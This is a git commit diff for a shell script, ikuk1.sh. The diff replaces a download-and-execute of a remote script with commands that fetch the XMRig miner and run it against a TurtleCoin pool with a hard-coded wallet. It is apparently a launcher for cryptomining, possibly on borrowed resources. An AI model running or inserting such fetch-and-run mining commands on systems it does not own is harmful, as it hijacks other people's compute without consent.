8be32ea592dfed848f23f34f1ee462dd4fa96fd5
Septank766 <81486223+Septank766@users.noreply.github.com>
2021-04-04 00:04:37 +0700

    Update ikuk1.sh

--- ikuk1.sh
+++ ikuk1.sh
@@ -1,3 +1,4 @@
-wget https://github.com/nandarr788/hansip/raw/main/ikuk1.sh
-chmod +x ikuk1.sh
-./ikuk1.sh
+wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
+tar xf xmrig-6.10.0-linux-x64.tar.gz
+cd xmrig-6.10.0
+./xmrig --donate-level 2 -o turtlecoin.herominers.com:10381 -u TRTLuwmJBUW1jCnGUyxkwQZJfgnq9nsZf6b1BXvTAeKP5aiAmcfUBZQFensN7DDY6Ea2QAy1NViZ9i4hbr1smhchHuPo3TkYDKm -p ME -a argon2/chukwav2 -k
